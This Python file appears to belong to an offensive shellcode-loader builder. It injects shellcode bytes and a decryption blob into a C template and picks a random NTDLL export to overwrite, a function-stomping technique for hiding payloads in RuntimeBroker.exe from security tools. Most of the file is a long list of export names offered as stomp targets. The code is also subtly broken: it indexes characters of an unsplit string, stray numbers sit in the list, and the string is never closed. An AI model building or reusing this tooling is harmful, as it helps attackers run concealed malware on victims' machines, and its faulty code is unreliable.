from random import randint
# Takes in a list of bytes for shellcode and a list of strings for decryption blob
def writePayload(shellcode, blob):

	#### Read in template
	mainFileR = open("./build/template.c", "r")
	mainLines = mainFileR.readlines()
	mainFileR.close()
	
	#### Update payload and size
	newLines = []
	for line in mainLines:
		# Update payload line
		if "BYTE pPayload[]" in line:
			line = "\tBYTE pPayload[] = { "
			for j in range(0,len(shellcode)):
				if j != len(shellcode)-1:
					line += f"0x{shellcode[j].to_bytes(1,byteorder='big').hex()}, "
				else:
					line += f"0x{shellcode[j].to_bytes(1,byteorder='big').hex()}" + " };\n"
		# Update size line
		if "SIZE_T sPayloadSize" in line:
			line = f"\tSIZE_T sPayloadSize = {len(shellcode)};\n"

		if "LPCSTR sStompFunction" in line:
			randomStomp = runtimeSafe[randint(0,len(runtimeSafe))]
			print(f"[!] Stomping NTDLL export {randomStomp}. Some stomps may cause issues...")
			line = f"\tLPCSTR sStompFunction = \"{randomStomp}\";\n"

		newLines.append(line)

	#### Decryption blob
	for i in range(0,len(newLines)):
		if "SIZE_T sPayloadSize" in newLines[i]:
			newLines[i+1:i+1] = blob

	#### Random function stomp
		

	#### Write to runner
	with open("./build/standard/main.c", mode="wt", encoding="utf-8") as mainFileW:
		for line in newLines:
			mainFileW.write(line)
	
	return

### This is a list of safe functions to stomp for RuntimeBroker.exe (not imported from NTDLL.DLL)

runtimeSafe = """RtlExtendedLargeIntegerDivide
RtlExtendedMagicDivide
RtlExtractBitMap
RtlFillMemory
RtlFillMemoryUlong
RtlFillMemoryUlonglong
RtlFinalReleaseOutOfProcessMemoryStream
RtlFindAceByType
RtlFindActivationContextSectionGuid
RtlFindActivationContextSectionString
RtlFindCharInUnicodeString
RtlFindClearBits
RtlFindClearBitsAndSet
RtlFindClearRuns
RtlFindClosestEncodableLength
RtlFindExportedRoutineByName
RtlFindLastBackwardRunClear
RtlFindLeastSignificantBit
RtlFindLongestRunClear
RtlFindMessage
RtlFindMostSignificantBit
RtlFindNextForwardRunClear
RtlFindSetBits
RtlFindSetBitsAndClear
RtlFindUnicodeSubstring
RtlFirstEntrySList
RtlFirstFreeAce
RtlFlsAlloc
RtlFlsFree
RtlFlsGetValue
RtlFlsSetValue
RtlFlushHeaps
RtlFlushSecureMemoryCache
RtlFormatCurrentUserKeyPath
RtlFormatMessage
RtlFormatMessageEx
RtlFreeActivationContextStack
RtlFreeAnsiString
RtlFreeHandle
RtlFreeHeap
RtlFreeMemoryBlockLookaside
RtlFreeOemString
RtlFreeSid
RtlFreeThreadActivationContextStack
RtlFreeUTF8String
RtlFreeUnicodeString
RtlFreeUserStack
RtlGUIDFromString
RtlGenerate8dot3Name
RtlGetAce
RtlGetActiveActivationContext
RtlGetActiveConsoleId
RtlGetAppContainerNamedObjectPath
RtlGetAppContainerParent
RtlGetAppContainerSidType
RtlGetCallersAddress
RtlGetCompressionWorkSpaceSize
RtlGetConsoleSessionForegroundProcessId
RtlGetControlSecurityDescriptor
RtlGetCriticalSectionRecursionCount
RtlGetCurrentDirectory_U
RtlGetCurrentPeb
RtlGetCurrentProcessorNumber
RtlGetCurrentProcessorNumberEx
RtlGetCurrentServiceSessionId
RtlGetCurrentTransaction
RtlGetDaclSecurityDescriptor
RtlGetDeviceFamilyInfoEnum
RtlGetElementGenericTable
RtlGetElementGenericTableAvl
RtlGetEnabledExtendedFeatures
RtlGetExePath
RtlGetExtendedContextLength
RtlGetExtendedContextLength2
RtlGetExtendedFeaturesMask
RtlGetFeatureToggleConfiguration
RtlGetFeatureTogglesChangeToken
RtlGetFileMUIPath
RtlGetFrame
RtlGetFullPathName_U
RtlGetFullPathName_UEx
RtlGetFullPathName_UstrEx
RtlGetGroupSecurityDescriptor
RtlGetImageFileMachines
RtlGetIntegerAtom
RtlGetInterruptTimePrecise
RtlGetLastNtStatus
RtlGetLastWin32Error
RtlGetLengthWithoutLastFullDosOrNtPathElement
RtlGetLengthWithoutTrailingPathSeperators
RtlGetLocaleFileMappingAddress
RtlGetLongestNtPathLength
RtlGetMultiTimePrecise
RtlGetNativeSystemInformation
RtlGetNextEntryHashTable
RtlGetNtGlobalFlags
RtlGetNtProductType
RtlGetNtSystemRoot
RtlGetNtVersionNumbers
RtlGetOwnerSecurityDescriptor
RtlGetParentLocaleName
RtlGetPersistedStateLocation
RtlGetProcessHeaps
RtlGetProcessPreferredUILanguages
RtlGetProductInfo
RtlGetReturnAddressHijackTarget
RtlGetSaclSecurityDescriptor
RtlGetSearchPath
RtlGetSecurityDescriptorRMControl
RtlGetSessionProperties
RtlGetSetBootStatusData
RtlGetSuiteMask
RtlGetSystemBootStatus
RtlGetSystemBootStatusEx
RtlGetSystemGlobalData
RtlGetSystemPreferredUILanguages
RtlGetSystemTimeAndBias
RtlGetSystemTimePrecise
RtlGetThreadErrorMode
RtlGetThreadLangIdByIndex
RtlGetThreadPreferredUILanguages
RtlGetThreadWorkOnBehalfTicket
RtlGetTokenNamedObjectPath
RtlGetUILanguageInfo
RtlGetUnloadEventTrace
RtlGetUnloadEventTraceEx
RtlGetUserInfoHeap
RtlGetUserPreferredUILanguages
RtlGetVersion
RtlGuardCheckLongJumpTarget
RtlHashUnicodeString
RtlHeapTrkInitialize
RtlIdentifierAuthoritySid
RtlIdnToAscii
RtlIdnToNameprepUnicode
RtlIdnToUnicode
RtlImageDirectoryEntryToData
RtlImageNtHeader
RtlImageNtHeaderEx
RtlImageRvaToSection
RtlImageRvaToVa
RtlImpersonateSelf
RtlImpersonateSelfEx
RtlIncrementCorrelationVector
RtlInitAnsiString
RtlInitAnsiStringEx
RtlInitBarrier
RtlInitCodePageTable
RtlInitEnumerationHashTable
RtlInitMemoryStream
RtlInitNlsTables
RtlInitOutOfProcessMemoryStream
RtlInitString
RtlInitStringEx
RtlInitStrongEnumerationHashTable
RtlInitUTF8String
RtlInitUTF8StringEx
RtlInitUnicodeString
RtlInitUnicodeStringEx
RtlInitWeakEnumerationHashTable
RtlInitializeAtomPackage
RtlInitializeBitMap
RtlInitializeConditionVariable
RtlInitializeContext
RtlInitializeCorrelationVector
RtlInitializeCriticalSection
RtlInitializeCriticalSectionAndSpinCount
RtlInitializeCriticalSectionEx
RtlInitializeExceptionChain
RtlInitializeExtendedContext
RtlInitializeExtendedContext2
RtlInitializeGenericTable
RtlInitializeGenericTableAvl
RtlInitializeHandleTable
RtlInitializeNtUserPfn
RtlInitializeRXact
RtlInitializeResource
RtlInitializeSListHead
RtlInitializeSRWLock
RtlInitializeSid
RtlInitializeSidEx
RtlInsertElementGenericTable
RtlInsertElementGenericTableAvl
RtlInsertElementGenericTableFull
RtlInsertElementGenericTableFullAvl
RtlInsertEntryHashTable
RtlInt64ToUnicodeString
RtlIntegerToChar
RtlIntegerToUnicodeString
RtlInterlockedClearBitRun
RtlInterlockedCompareExchange64
RtlInterlockedFlushSList
RtlInterlockedPopEntrySList
RtlInterlockedPushEntrySList
RtlInterlockedPushListSListEx
RtlInterlockedSetBitRun
RtlIoDecodeMemIoResource
RtlIoEncodeMemIoResource
RtlIpv4AddressToStringA
RtlIpv4AddressToStringExA
RtlIpv4AddressToStringExW
RtlIpv4AddressToStringW
RtlIpv4StringToAddressA
RtlIpv4StringToAddressExA
RtlIpv4StringToAddressExW
RtlIpv4StringToAddressW
RtlIpv6AddressToStringA
RtlIpv6AddressToStringExA
RtlIpv6AddressToStringExW
RtlIpv6AddressToStringW
RtlIpv6StringToAddressA
RtlIpv6StringToAddressExA
RtlIpv6StringToAddressExW
RtlIpv6StringToAddressW
RtlIsActivationContextActive
RtlIsApiSetImplemented
RtlIsCapabilitySid
RtlIsCloudFilesPlaceholder
RtlIsCriticalSectionLocked
RtlIsCriticalSectionLockedByThread
RtlIsCurrentProcess
RtlIsCurrentThread
RtlIsCurrentThreadAttachExempt
RtlIsDosDeviceName_U
RtlIsElevatedRid
RtlIsEnclaveFeaturePresent
RtlIsFeatureEnabledForEnterprise
RtlIsGenericTableEmpty
RtlIsGenericTableEmptyAvl
RtlIsMultiSessionSku
RtlIsMultiUsersInSessionSku
RtlIsNameInExpression
RtlIsNameInUnUpcasedExpression
RtlIsNameLegalDOS8Dot3
RtlIsNonEmptyDirectoryReparsePointAllowed
RtlIsNormalizedString
RtlIsPackageSid
RtlIsParentOfChildAppContainer
RtlIsPartialPlaceholder
RtlIsPartialPlaceholderFileHandle
RtlIsPartialPlaceholderFileInfo
RtlIsProcessorFeaturePresent
RtlIsStateSeparationEnabled
RtlIsTextUnicode
RtlIsThreadWithinLoaderCallout
RtlIsUntrustedObject
RtlIsValidHandle
RtlIsValidIndexHandle
RtlIsValidLocaleName
RtlIsValidProcessTrustLabelSid
RtlIsZeroMemory
RtlKnownExceptionFilter
RtlLCIDToCultureName
RtlLargeIntegerAdd
RtlLargeIntegerArithmeticShift
RtlLargeIntegerDivide
RtlLargeIntegerNegate
RtlLargeIntegerShiftLeft
RtlLargeIntegerShiftRight
RtlLargeIntegerSubtract
RtlLargeIntegerToChar
RtlLcidToLocaleName
RtlLeaveCriticalSection
RtlLengthRequiredSid
RtlLengthSecurityDescriptor
RtlLengthSid
RtlLengthSidAsUnicodeString
RtlLoadString
RtlLocalTimeToSystemTime
RtlLocaleNameToLcid
RtlLocateExtendedFeature
RtlLocateExtendedFeature2
RtlLocateLegacyContext
RtlLockBootStatusData
RtlLockCurrentThread
RtlLockHeap
RtlLockMemoryBlockLookaside
RtlLockMemoryStreamRegion
RtlLockMemoryZone
RtlLockModuleSection
RtlLogStackBackTrace
RtlLookupAtomInAtomTable
RtlLookupElementGenericTable
RtlLookupElementGenericTableAvl
RtlLookupElementGenericTableFull
RtlLookupElementGenericTableFullAvl
RtlLookupEntryHashTable
RtlLookupFirstMatchingElementGenericTableAvl
RtlMakeSelfRelativeSD
RtlMapGenericMask
RtlMapSecurityErrorToNtStatus
RtlMoveMemory
RtlMultiAppendUnicodeStringBuffer
RtlMultiByteToUnicodeN
RtlMultiByteToUnicodeSize
RtlMultipleAllocateHeap
RtlMultipleFreeHeap
RtlNewInstanceSecurityObject
RtlNewSecurityGrantedAccess
RtlNewSecurityObject
RtlNewSecurityObjectEx
RtlNewSecurityObjectWithMultipleInheritance
RtlNormalizeProcessParams
RtlNormalizeSecurityDescriptor
RtlNormalizeString
RtlNotifyFeatureToggleUsage
RtlNotifyFeatureUsage
RtlNtPathNameToDosPathName
RtlNtStatusToDosErrorNoTeb
RtlNumberGenericTableElements
RtlNumberGenericTableElementsAvl
RtlNumberOfClearBits
RtlNumberOfClearBitsInRange
RtlNumberOfSetBits
RtlNumberOfSetBitsInRange
RtlNumberOfSetBitsUlongPtr
RtlOemStringToUnicodeSize
RtlOemStringToUnicodeString
RtlOemToUnicodeN
RtlOpenCurrentUser
RtlOsDeploymentState
RtlOverwriteFeatureConfigurationBuffer
RtlOwnerAcesPresent
RtlPcToFileHeader
RtlPinAtomInAtomTable
RtlPopFrame
RtlPrefixString
RtlPrefixUnicodeString
RtlProcessFlsData
RtlProtectHeap
RtlPublishWnfStateData
RtlPushFrame
RtlQueryActivationContextApplicationSettings
RtlQueryAllFeatureConfigurations
RtlQueryAtomInAtomTable
RtlQueryCriticalSectionOwner
RtlQueryDepthSList
RtlQueryDynamicTimeZoneInformation
RtlQueryElevationFlags
RtlQueryEnvironmentVariable
RtlQueryEnvironmentVariable_U
RtlQueryFeatureConfiguration
RtlQueryFeatureConfigurationChangeStamp
RtlQueryFeatureUsageNotificationSubscriptions
RtlQueryHeapInformation
RtlQueryImageMitigationPolicy
RtlQueryInformationAcl
RtlQueryInformationActivationContext
RtlQueryInformationActiveActivationContext
RtlQueryInterfaceMemoryStream
RtlQueryModuleInformation
RtlQueryPackageIdentityEx
RtlQueryPerformanceCounter
RtlQueryPerformanceFrequency
RtlQueryPointerMapping
RtlQueryProcessBackTraceInformation
RtlQueryProcessDebugInformation
RtlQueryProcessHeapInformation
RtlQueryProcessLockInformation
RtlQueryProcessPlaceholderCompatibilityMode
RtlQueryPropertyStore
RtlQueryProtectedPolicy
RtlQueryRegistryValueWithFallback
RtlQueryRegistryValues
RtlQueryRegistryValuesEx
RtlQueryResourcePolicy
RtlQuerySecurityObject
RtlQueryTagHeap
RtlQueryThreadPlaceholderCompatibilityMode
RtlQueryThreadProfiling
RtlQueryTimeZoneInformation
RtlQueryTokenHostIdAsUlong64
RtlQueryUnbiasedInterruptTime
RtlQueryValidationRunlevel
RtlQueryWnfMetaNotification
RtlQueryWnfStateData
RtlQueryWnfStateDataWithExplicitScope
RtlQueueApcWow64Thread
RtlQueueWorkItem
RtlRaiseCustomSystemEventTrigger
RtlRaiseException
RtlRaiseStatus
RtlRandom
RtlRandomEx
RtlRbInsertNodeEx
RtlRbRemoveNode
RtlReAllocateHeap
RtlReadOutOfProcessMemoryStream
RtlReadThreadProfilingData
RtlRealPredecessor
RtlRealSuccessor
RtlRegisterFeatureConfigurationChangeNotification
RtlRegisterForWnfMetaNotification
RtlRegisterSecureMemoryCacheCallback
RtlRegisterThreadWithCsrss
RtlRegisterWait
RtlReleaseActivationContext
RtlReleasePath
RtlReleasePebLock
RtlReleasePrivilege
RtlReleaseRelativeName
RtlReleaseResource
RtlReleaseSRWLockExclusive
RtlReleaseSRWLockShared
RtlRemoteCall
RtlRemoveEntryHashTable
RtlRemovePointerMapping
RtlRemovePrivileges
RtlRemovePropertyStore
RtlRemoveVectoredContinueHandler
RtlRemoveVectoredExceptionHandler
RtlReplaceSidInSd
RtlReplaceSystemDirectoryInPath
RtlReportException
RtlReportExceptionEx
RtlReportSilentProcessExit
RtlReportSqmEscalation
RtlResetMemoryBlockLookaside
RtlResetMemoryZone
RtlResetNtUserPfn
RtlResetRtlTranslations
RtlRestoreBootStatusDefaults
RtlRestoreContext
RtlRestoreLastWin32Error
RtlRestoreSystemBootStatusDefaults
RtlRestoreThreadPreferredUILanguages
RtlRetrieveNtUserPfn
RtlRevertMemoryStream
RtlRunDecodeUnicodeString
RtlRunEncodeUnicodeString
RtlRunOnceBeginInitialize
RtlRunOnceComplete
RtlRunOnceExecuteOnce
RtlRunOnceInitialize
RtlSecondsSince1970ToTime
RtlSecondsSince1980ToTime
RtlSeekMemoryStream
RtlSelfRelativeToAbsoluteSD
RtlSelfRelativeToAbsoluteSD2
RtlSendMsgToSm
RtlSetAllBits
RtlSetAttributesSecurityDescriptor
RtlSetBit
RtlSetBits
RtlSetControlSecurityDescriptor
RtlSetCriticalSectionSpinCount
RtlSetCurrentDirectory_U
RtlSetCurrentEnvironment
RtlSetCurrentTransaction
RtlSetDaclSecurityDescriptor
RtlSetDynamicTimeZoneInformation
RtlSetEnvironmentStrings
RtlSetEnvironmentVar
RtlSetEnvironmentVariable
RtlSetExtendedFeaturesMask
RtlSetFeatureConfigurations
RtlSetGroupSecurityDescriptor
RtlSetHeapInformation
RtlSetImageMitigationPolicy
RtlSetInformationAcl
RtlSetIoCompletionCallback
RtlSetLastWin32Error
RtlSetLastWin32ErrorAndNtStatusFromNtStatus
RtlSetMemoryStreamSize
RtlSetOwnerSecurityDescriptor
RtlSetPortableOperatingSystem
RtlSetProcessDebugInformation
RtlSetProcessIsCritical
RtlSetProcessPlaceholderCompatibilityMode
RtlSetProcessPreferredUILanguages
RtlSetProtectedPolicy
RtlSetProxiedProcessId
RtlSetSaclSecurityDescriptor
RtlSetSearchPathMode
RtlSetSecurityDescriptorRMControl
RtlSetSecurityObject
RtlSetSecurityObjectEx
RtlSetSystemBootStatus
RtlSetSystemBootStatusEx
RtlSetThreadErrorMode
RtlSetThreadIsCritical
RtlSetThreadPlaceholderCompatibilityMode
RtlSetThreadPoolStartFunc
RtlSetThreadPreferredUILanguages
RtlSetThreadPreferredUILanguages2
RtlSetThreadSubProcessTag
RtlSetThreadWorkOnBehalfTicket
RtlSetTimeZoneInformation
RtlSetTimer
RtlSetUnhandledExceptionFilter
RtlSetUserCallbackExceptionFilter
RtlSetUserFlagsHeap
RtlSetUserValueHeap
RtlSidDominates
RtlSidDominatesForTrust
RtlSidEqualLevel
RtlSidHashInitialize
RtlSidHashLookup
RtlSidIsHigherLevel
RtlSizeHeap
RtlSleepConditionVariableCS
RtlSleepConditionVariableSRW
RtlSplay
RtlStartRXact
RtlStatMemoryStream
RtlStringFromGUID
RtlStringFromGUIDEx
RtlStronglyEnumerateEntryHashTable
RtlSubAuthorityCountSid
RtlSubAuthoritySid
RtlSubscribeForFeatureUsageNotification
RtlSubscribeWnfStateChangeNotification
RtlSubtreePredecessor
RtlSubtreeSuccessor
RtlSwitchedVVI
RtlSystemTimeToLocalTime
RtlTestAndPublishWnfStateData
RtlTestBit
RtlTestProtectedAccess
RtlTimeFieldsToTime
RtlTimeToElapsedTimeFields
RtlTimeToSecondsSince1970
RtlTimeToSecondsSince1980
RtlTimeToTimeFields
RtlTraceDatabaseAdd
RtlTraceDatabaseCreate
RtlTraceDatabaseDestroy
RtlTraceDatabaseEnumerate
RtlTraceDatabaseFind
RtlTraceDatabaseLock
RtlTraceDatabaseUnlock
RtlTraceDatabaseValidate
RtlTryAcquirePebLock
RtlTryAcquireSRWLockExclusive
RtlTryAcquireSRWLockShared
RtlTryConvertSRWLockSharedToExclusiveOrRelease
RtlTryEnterCriticalSection
RtlUTF8StringToUnicodeString
RtlUTF8ToUnicodeN
RtlUdiv128
608
609
RtlUnhandledExceptionFilter
RtlUnhandledExceptionFilter2
RtlUnicodeStringToAnsiSize
RtlUnicodeStringToAnsiString
RtlUnicodeStringToCountedOemString
RtlUnicodeStringToInteger
RtlUnicodeStringToOemSize
RtlUnicodeStringToOemString
RtlUnicodeStringToUTF8String
RtlUnicodeToCustomCPN
RtlUnicodeToMultiByteN
RtlUnicodeToMultiByteSize
RtlUnicodeToOemN
RtlUnicodeToUTF8N
RtlUniform
RtlUnlockBootStatusData
RtlUnlockCurrentThread
RtlUnlockHeap
RtlUnlockMemoryBlockLookaside
RtlUnlockMemoryStreamRegion
RtlUnlockMemoryZone
RtlUnlockModuleSection
RtlUnregisterFeatureConfigurationChangeNotification
RtlUnsubscribeFromFeatureUsageNotifications
RtlUnsubscribeWnfNotificationWaitForCompletion
RtlUnsubscribeWnfNotificationWithCompletionCallback
RtlUnsubscribeWnfStateChangeNotification
RtlUnwind
RtlUpcaseUnicodeChar
RtlUpcaseUnicodeString
RtlUpcaseUnicodeStringToAnsiString
RtlUpcaseUnicodeStringToCountedOemString
RtlUpcaseUnicodeStringToOemString
RtlUpcaseUnicodeToCustomCPN
RtlUpcaseUnicodeToMultiByteN
RtlUpcaseUnicodeToOemN
RtlUpdateClonedCriticalSection
RtlUpdateClonedSRWLock
RtlUpdateTimer
RtlUpperChar
RtlUpperString
RtlUserFiberStart
RtlUserThreadStart
635
RtlValidAcl
RtlValidProcessProtection
RtlValidRelativeSecurityDescriptor
RtlValidSecurityDescriptor
RtlValidSid
RtlValidateCorrelationVector
RtlValidateHeap
RtlValidateProcessHeaps
RtlValidateUnicodeString
RtlVerifyVersionInfo
RtlWaitForWnfMetaNotification
RtlWaitOnAddress
RtlWakeAddressAll
RtlWakeAddressAllNoFence
RtlWakeAddressSingle
RtlWakeAddressSingleNoFence
RtlWakeAllConditionVariable
RtlWakeConditionVariable
RtlWalkFrameChain
RtlWalkHeap
RtlWeaklyEnumerateEntryHashTable
RtlWerpReportException
RtlWnfCompareChangeStamp
RtlWnfDllUnloadCallback
RtlWow64CallFunction64
RtlWow64EnableFsRedirection
RtlWow64EnableFsRedirectionEx
RtlWow64GetCurrentMachine
RtlWow64GetEquivalentMachineCHPE
RtlWow64GetProcessMachines
RtlWow64GetSharedInfoProcess
RtlWow64IsWowGuestMachineSupported
RtlWow64LogMessageInEventLogger
RtlWriteMemoryStream
RtlWriteRegistryValue
RtlZeroHeap
RtlZeroMemory
RtlZombifyActivationContext
RtlpApplyLengthFunction
RtlpCheckDynamicTimeZoneInformation
RtlpCleanupRegistryKeys
RtlpConvertAbsoluteToRelativeSecurityAttribute
RtlpConvertCultureNamesToLCIDs
RtlpConvertLCIDsToCultureNames
RtlpConvertRelativeToAbsoluteSecurityAttribute
RtlpCreateProcessRegistryInfo
RtlpEnsureBufferSize
RtlpFreezeTimeBias
RtlpGetDeviceFamilyInfoEnum
RtlpGetLCIDFromLangInfoNode
RtlpGetNameFromLangInfoNode
RtlpGetSystemDefaultUILanguage
RtlpGetUserOrMachineUILanguage4NLS
RtlpInitializeLangRegistryInfo
RtlpIsQualifiedLanguage
RtlpLoadMachineUIByPolicy
RtlpLoadUserUIByPolicy
RtlpMergeSecurityAttributeInformation
RtlpMuiFreeLangRegistryInfo
RtlpMuiRegCreateRegistryInfo
RtlpMuiRegFreeRegistryInfo
RtlpMuiRegLoadRegistryInfo
RtlpNotOwnerCriticalSection
RtlpNtCreateKey
RtlpNtEnumerateSubKey
RtlpNtMakeTemporaryKey
RtlpNtOpenKey
RtlpNtQueryValueKey
RtlpNtSetValueKey
RtlpQueryDefaultUILanguage
RtlpQueryProcessDebugInformationRemote
RtlpRefreshCachedUILanguage
RtlpSetInstallLanguage
RtlpSetPreferredUILanguages
RtlpSetUserPreferredUILanguages
RtlpTimeFieldsToTime
RtlpTimeToTimeFields
RtlpUnWaitCriticalSection
RtlpVerifyAndCommitUILanguageSettings
RtlpWaitForCriticalSection
RtlxAnsiStringToUnicodeSize
RtlxOemStringToUnicodeSize
RtlxUnicodeStringToAnsiSize
RtlxUnicodeStringToOemSize
SbExecuteProcedure
SbSelectProcedure
ShipAssert
ShipAssertGetBufferInfo
ShipAssertMsgA
ShipAssertMsgW
TpAllocAlpcCompletion
TpAllocAlpcCompletionEx
TpAllocCleanupGroup
TpAllocIoCompletion
TpAllocJobNotification
TpAllocPool
TpAllocTimer
TpAllocWait
TpAllocWork
TpAlpcRegisterCompletionList
TpAlpcUnregisterCompletionList
TpCallbackDetectedUnrecoverableError
TpCallbackIndependent
TpCallbackLeaveCriticalSectionOnCompletion
TpCallbackMayRunLong
TpCallbackReleaseMutexOnCompletion
TpCallbackReleaseSemaphoreOnCompletion
TpCallbackSendAlpcMessageOnCompletion
TpCallbackSendPendingAlpcMessage
TpCallbackSetEventOnCompletion
TpCallbackUnloadDllOnCompletion
TpCancelAsyncIoOperation
TpCaptureCaller
TpCheckTerminateWorker
TpDbgDumpHeapUsage
TpDbgSetLogRoutine
TpDisablePoolCallbackChecks
TpDisassociateCallback
TpIsTimerSet
TpPostWork
TpQueryPoolStackInformation
TpReleaseAlpcCompletion
TpReleaseCleanupGroup
TpReleaseCleanupGroupMembers
TpReleaseIoCompletion
TpReleaseJobNotification
TpReleasePool
TpReleaseTimer
TpReleaseWait
TpReleaseWork
TpSetDefaultPoolMaxThreads
TpSetDefaultPoolStackInformation
TpSetPoolMaxThreads
TpSetPoolMaxThreadsSoftLimit
TpSetPoolMinThreads
TpSetPoolStackInformation
TpSetPoolThreadBasePriority
TpSetPoolThreadCpuSets
TpSetPoolWorkerThreadIdleTimeout
TpSetTimer
TpSetTimerEx
TpSetWait
TpSetWaitEx
TpSimpleTryPost
TpStartAsyncIoOperation
TpTimerOutstandingCallbackCount
TpTrimPools
TpWaitForAlpcCompletion
TpWaitForIoCompletion
TpWaitForJobNotification
TpWaitForTimer
TpWaitForWait
TpWaitForWork
TpWorkOnBehalfClearTicket
TpWorkOnBehalfSetTicket
VerSetConditionMask
WerReportExceptionWorker
WerReportSQMEvent
WinSqmAddToAverageDWORD
WinSqmAddToStream
WinSqmAddToStreamEx
WinSqmCheckEscalationAddToStreamEx
WinSqmCheckEscalationSetDWORD
WinSqmCheckEscalationSetDWORD64
WinSqmCheckEscalationSetString
WinSqmCommonDatapointDelete
WinSqmCommonDatapointSetDWORD
WinSqmCommonDatapointSetDWORD64
WinSqmCommonDatapointSetStreamEx
WinSqmCommonDatapointSetString
WinSqmEndSession
WinSqmEventEnabled
WinSqmEventWrite
WinSqmGetEscalationRuleStatus
WinSqmGetInstrumentationProperty
WinSqmIncrementDWORD
WinSqmIsOptedIn
WinSqmIsOptedInEx
WinSqmIsSessionDisabled
WinSqmSetDWORD
WinSqmSetDWORD64
WinSqmSetEscalationInfo
WinSqmSetIfMaxDWORD
WinSqmSetIfMinDWORD
WinSqmSetString
WinSqmStartSession
WinSqmStartSessionForPartner
WinSqmStartSqmOptinListener
Wow64Transition
ZwAcceptConnectPort
ZwAccessCheck
ZwAccessCheckAndAuditAlarm
ZwAccessCheckByType
ZwAccessCheckByTypeAndAuditAlarm
ZwAccessCheckByTypeResultList
ZwAccessCheckByTypeResultListAndAuditAlarm
ZwAccessCheckByTypeResultListAndAuditAlarmByHandle
ZwAcquireCrossVmMutant
ZwAcquireProcessActivityReference
ZwAddAtom
ZwAddAtomEx
ZwAddBootEntry
ZwAddDriverEntry
ZwAdjustGroupsToken
ZwAdjustPrivilegesToken
ZwAdjustTokenClaimsAndDeviceGroups
ZwAlertResumeThread
ZwAlertThread
ZwAlertThreadByThreadId
ZwAllocateLocallyUniqueId
ZwAllocateReserveObject
ZwAllocateUserPhysicalPages
ZwAllocateUserPhysicalPagesEx
ZwAllocateUuids
ZwAllocateVirtualMemory
ZwAllocateVirtualMemoryEx
ZwAlpcAcceptConnectPort
ZwAlpcCancelMessage
ZwAlpcConnectPort
ZwAlpcConnectPortEx
ZwAlpcCreatePort
ZwAlpcCreatePortSection
ZwAlpcCreateResourceReserve
ZwAlpcCreateSectionView
ZwAlpcCreateSecurityContext
ZwAlpcDeletePortSection
ZwAlpcDeleteResourceReserve
ZwAlpcDeleteSectionView
ZwAlpcDeleteSecurityContext
ZwAlpcDisconnectPort
ZwAlpcImpersonateClientContainerOfPort
ZwAlpcImpersonateClientOfPort
ZwAlpcOpenSenderProcess
ZwAlpcOpenSenderThread
ZwAlpcQueryInformation
ZwAlpcQueryInformationMessage
ZwAlpcRevokeSecurityContext
ZwAlpcSendWaitReceivePort
ZwAlpcSetInformation
ZwApphelpCacheControl
ZwAreMappedFilesTheSame
ZwAssignProcessToJobObject
ZwAssociateWaitCompletionPacket
ZwCallEnclave
ZwCallbackReturn
ZwCancelIoFile
ZwCancelIoFileEx
ZwCancelSynchronousIoFile
ZwCancelTimer
ZwCancelTimer2
ZwCancelWaitCompletionPacket
ZwChangeProcessState
ZwChangeThreadState
ZwClearEvent
ZwClose
ZwCloseObjectAuditAlarm
ZwCommitComplete
ZwCommitEnlistment
ZwCommitRegistryTransaction
ZwCommitTransaction
ZwCompactKeys
ZwCompareObjects
ZwCompareSigningLevels
ZwCompareTokens
ZwCompleteConnectPort
ZwCompressKey
ZwConnectPort
ZwContinue
ZwContinueEx
ZwConvertBetweenAuxiliaryCounterAndPerformanceCounter
ZwCopyFileChunk
ZwCreateCpuPartition
ZwCreateCrossVmEvent
ZwCreateCrossVmMutant
ZwCreateDebugObject
ZwCreateDirectoryObject
ZwCreateDirectoryObjectEx
ZwCreateEnclave
ZwCreateEnlistment
ZwCreateEvent
ZwCreateEventPair
ZwCreateFile
ZwCreateIRTimer
ZwCreateIoCompletion
ZwCreateIoRing
ZwCreateJobObject
ZwCreateJobSet
ZwCreateKey
ZwCreateKeyTransacted
ZwCreateKeyedEvent
ZwCreateLowBoxToken
ZwCreateMailslotFile
ZwCreateMutant
ZwCreateNamedPipeFile
ZwCreatePagingFile
ZwCreatePartition
ZwCreatePort
ZwCreatePrivateNamespace
ZwCreateProcess
ZwCreateProcessEx
ZwCreateProcessStateChange
ZwCreateProfile
ZwCreateProfileEx
ZwCreateRegistryTransaction
ZwCreateResourceManager
ZwCreateSection
ZwCreateSectionEx
ZwCreateSemaphore
ZwCreateSymbolicLinkObject
ZwCreateThread
ZwCreateThreadEx
ZwCreateThreadStateChange
ZwCreateTimer
ZwCreateTimer2
ZwCreateToken
ZwCreateTokenEx
ZwCreateTransaction
ZwCreateTransactionManager
ZwCreateUserProcess
ZwCreateWaitCompletionPacket
ZwCreateWaitablePort
ZwCreateWnfStateName
ZwCreateWorkerFactory
ZwDebugActiveProcess
ZwDebugContinue
ZwDelayExecution
ZwDeleteAtom
ZwDeleteBootEntry
ZwDeleteDriverEntry
ZwDeleteFile
ZwDeleteKey
ZwDeleteObjectAuditAlarm
ZwDeletePrivateNamespace
ZwDeleteValueKey
ZwDeleteWnfStateData
ZwDeleteWnfStateName
ZwDeviceIoControlFile
ZwDirectGraphicsCall
ZwDisableLastKnownGood
ZwDisplayString
ZwDrawText
ZwDuplicateObject
ZwDuplicateToken
ZwEnableLastKnownGood
ZwEnumerateBootEntries
ZwEnumerateDriverEntries
ZwEnumerateKey
ZwEnumerateSystemEnvironmentValuesEx
ZwEnumerateTransactionObject
ZwEnumerateValueKey
ZwExtendSection
ZwFilterBootOption
ZwFilterToken
ZwFilterTokenEx
ZwFindAtom
ZwFlushBuffersFile
ZwFlushBuffersFileEx
ZwFlushInstallUILanguage
ZwFlushInstructionCache
ZwFlushKey
ZwFlushProcessWriteBuffers
ZwFlushVirtualMemory
ZwFlushWriteBuffer
ZwFreeUserPhysicalPages
ZwFreeVirtualMemory
ZwFreezeRegistry
ZwFreezeTransactions
ZwFsControlFile
ZwGetCachedSigningLevel
ZwGetCompleteWnfStateSubscription
ZwGetContextThread
ZwGetCurrentProcessorNumber
ZwGetCurrentProcessorNumberEx
ZwGetDevicePowerState
ZwGetMUIRegistryInfo
ZwGetNextProcess
ZwGetNextThread
ZwGetNlsSectionPtr
ZwGetNotificationResourceManager
ZwGetWriteWatch
ZwImpersonateAnonymousToken
ZwImpersonateClientOfPort
ZwImpersonateThread
ZwInitializeEnclave
ZwInitializeNlsFiles
ZwInitializeRegistry
ZwInitiatePowerAction
ZwIsProcessInJob
ZwIsSystemResumeAutomatic
ZwIsUILanguageComitted
ZwListenPort
ZwLoadDriver
ZwLoadEnclaveData
ZwLoadKey
ZwLoadKey2
